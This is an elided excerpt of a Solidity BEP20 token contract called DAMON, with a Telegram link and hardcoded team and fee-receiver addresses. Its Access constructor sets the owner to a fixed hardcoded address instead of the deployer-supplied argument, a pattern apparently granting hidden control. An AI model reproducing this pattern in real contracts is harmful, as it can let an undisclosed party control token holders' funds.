...
// Telegram - https://t.me/Damon_Portal
...
abstract contract Access {
    ...
    constructor(address _owner) {
        owner = 0xEEA8538df44Fa1e7422a8dA373b9ff69412C8f17;
        SOIN[_owner] = true;
    }
...
contract DAMON is IBEP20, Access {
    using SafeMath for uint256;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address TEAM  = 0xAFDCAD0Db0a9abbbC2956689e1b3E22e957b24A1;
    ...
    constructor (address rt) Access(msg.sender) {

        router = IDEXRouter(rt);
        ...
        marketingFeeReceiver =0x4C2511AaE0493890AafEA40b2Fe4Eee8e7C2398A;
